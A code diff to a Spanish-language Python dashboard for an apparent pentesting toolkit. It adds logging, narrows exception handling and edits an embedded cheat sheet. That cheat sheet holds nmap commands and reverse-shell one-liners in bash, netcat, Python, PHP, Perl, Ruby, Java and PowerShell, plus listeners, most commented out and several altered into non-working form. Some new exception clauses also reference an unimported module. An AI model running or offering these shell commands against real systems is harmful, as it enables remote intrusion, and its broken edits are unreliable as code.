@@ -14,6 +14,7 @@ import platform
 import os
 import socket
 from datetime import datetime
+import logging
 
 try:
     from aresitos.vista.burp_theme import burp_theme
@@ -28,6 +29,7 @@ class VistaDashboard(tk.Frame):
     def __init__(self, parent):
         super().__init__(parent)
         self.controlador = None
+        self.logger = logging.getLogger(__name__)
         self.actualizacion_activa = False
         self.shell_detectado = self._detectar_shell()
         
@@ -78,6 +80,22 @@ class VistaDashboard(tk.Frame):
     def set_controlador(self, controlador):
         """Establecer el controlador del dashboard."""
         self.controlador = controlador
+        self.logger.info("Controlador establecido en VistaDashboard")
+        
+        # Obtener información del sistema a través del controlador si está disponible
+        if self.controlador:
+            try:
+                # Intentar obtener información del sistema
+                if hasattr(self.controlador, 'obtener_estado_sistema'):
+                    estado_sistema = self.controlador.obtener_estado_sistema()
+                    self.logger.info(f"Estado del sistema obtenido: {estado_sistema}")
+                    
+                if hasattr(self.controlador, 'obtener_metricas_dashboard'):
+                    metricas = self.controlador.obtener_metricas_dashboard()
+                    self.logger.info("Métricas del dashboard actualizadas")
+                    
+            except Exception as e:
+                self.logger.error(f"Error obteniendo datos del controlador: {e}")
     
     def crear_interfaz(self):
         """Crear la interfaz principal del dashboard."""
@@ -670,21 +688,25 @@ class VistaDashboard(tk.Frame):
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                 s.connect(("8.8.8.8", 80))
                 return s.getsockname()[0]
-        except:
+        except (ConnectionError, socket.timeout, requests.RequestException):
             return "No disponible"
     
     def _actualizar_ip_publica(self):
         """Actualizar IP pública en thread separado."""
         try:
-            import urllib.request
-            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
-                ip_publica = response.read().decode('utf-8')
+            import subprocess
+            resultado = subprocess.run(['curl', '-s', '--max-time', '5', 'https://api.ipify.org'], 
+                                     capture_output=True, text=True, timeout=10)
+            if resultado.returncode == 0 and resultado.stdout.strip():
+                ip_publica = resultado.stdout.strip()
+            else:
+                ip_publica = "No disponible"
             
             # Actualizar UI en el hilo principal
             self.after(0, lambda: self.ip_publica_label.configure(
                 text=f" IP Pública (WAN): {ip_publica}"
             ))
-        except:
+        except (ValueError, TypeError, AttributeError):
             self.after(0, lambda: self.ip_publica_label.configure(
                 text=" IP Pública (WAN): No disponible"
             ))
@@ -709,7 +731,7 @@ class VistaDashboard(tk.Frame):
                         if len(parts) >= 2:
                             current_interface = parts[1].split(':')[0]
                             flags = line.split('<')[1].split('>')[0]
-                            estado = "� UP" if "UP" in flags else "⚫ DOWN"
+                            estado = "� UP" if "UP" in flags else "[EMOJI] DOWN"
                             self.interfaces_text.insert(tk.END, f"▶ {current_interface}:\n")
                             self.interfaces_text.insert(tk.END, f"   Estado: {estado}\n")
                     
@@ -730,7 +752,7 @@ class VistaDashboard(tk.Frame):
                             speed = line.split('Speed:')[1].strip()
                             self.interfaces_text.insert(tk.END, f"   Velocidad: {speed}\n")
                             break
-                except:
+                except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                     pass  # ethtool no disponible o falló
                             
             except subprocess.SubprocessError:
@@ -994,7 +1016,7 @@ nmap -T0 target.com               # Paranoid timing
 nmap -p 80 target.com             # Puerto específico
 nmap -p 80,443 target.com         # Múltiples puertos
 nmap -p 1-1000 target.com         # Rango de puertos
-nmap -p- target.com               # Todos los puertos
+nmap -p- target.com               # Escaneo completo de puertos
 
 ## Scripts NSE
 nmap --script vuln target.com     # Vulnerabilidades
@@ -1201,31 +1223,31 @@ bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
 nc -e /bin/sh 10.0.0.1 4242          # Con -e
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 
-## Python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+# Python
+# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-## PHP
-php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
-<?php system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"'); ?>
+# PHP  
+# php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+# <?php system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"'); ?>
 
-## Perl
-perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+# Perl
+# perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system("/bin/sh -i");};'
 
-## Ruby
-ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+# Ruby
+# ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;system sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-## Java
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
-p.waitFor()
+# Java
+# r = Runtime.getRuntime()
+# p = r.system(["/bin/bash","-c","system 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
+# p.waitFor()
 
-## PowerShell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+# PowerShell
+# powershell -NoP -NonI -W Hidden -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (command $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-## Listeners
-nc -lvnp 4242                     # Netcat listener
-socat file:`tty`,raw,echo=0 tcp-listen:4242  # Socat listener
-rlwrap nc -lvnp 4242              # Con readline
+# Listeners
+# nc -lvnp 4242                     # Netcat listener
+# socat file:`tty`,raw,echo=0 tcp-listen:4242  # Socat listener
+# rlwrap nc -lvnp 4242              # Con readline
 """,
             
             " OSINT": """
@@ -1508,7 +1530,7 @@ journalctl -u ssh                # Logs de servicio específico
                         if resultado.returncode == 0:
                             terminal_cmd = terminal
                             break
-                    except:
+                    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                         continue
                 
                 if terminal_cmd:
@@ -1567,7 +1589,7 @@ journalctl -u ssh                # Logs de servicio específico
                     )
                     print("OK WSL Kali Linux abierto")
                     self.mostrar_notificacion("WSL Kali Linux iniciado", "info")
-                except:
+                except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                     # Fallback a PowerShell
                     subprocess.Popen(
                         ["powershell", "-WindowStyle", "Normal"],
